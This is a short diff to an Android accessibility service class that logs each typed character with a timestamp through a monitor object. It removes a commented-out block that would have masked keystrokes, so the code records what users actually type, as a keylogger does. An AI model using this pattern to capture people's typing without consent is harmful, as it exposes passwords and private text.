@@ -339,10 +339,7 @@ public class TBBService extends AccessibilityService {
 								keypressed = ""
 										+ keypressed
 												.charAt(keypressed.length() - 2);
-								/*
-								 * if (keypressed.equals(" ")) keypressed = " ";
-								 * else keypressed = "x";
-								 */
+
 								mMonitor.registerKeystroke(keypressed, System.currentTimeMillis(), text);
 							}
 						}
